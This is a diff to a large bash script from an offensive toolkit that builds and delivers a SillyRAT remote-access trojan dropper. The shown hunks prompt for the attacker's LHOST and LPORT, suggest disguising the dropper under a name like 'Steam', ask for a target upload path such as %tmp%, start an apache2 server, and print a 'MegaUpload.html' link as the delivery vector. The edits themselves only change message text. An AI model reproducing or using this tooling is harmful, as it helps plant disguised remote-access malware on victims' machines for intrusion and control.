@@ -10263,7 +10263,7 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Steam\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
 SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper.\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
-if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
+if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
@@ -10421,7 +10421,7 @@ fi
 cd $IPATH
 ## Print attack vector on terminal
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
-echo "${BlueF}---";echo "- ${YellowF}CHOSE ONE TECHNIC TO DELIVER DROPPER${BlueF}"
+echo "${BlueF}---";echo "- ${YellowF}ATTACK VECTORS AVAILABLE TO DELIVER DROPPER${BlueF}"
 echo "- ${YellowF}URL LINK:${BlueF} http://$lhost/MegaUpload.html"
 
 if [ "$SOSP" = "Linux" ]; then
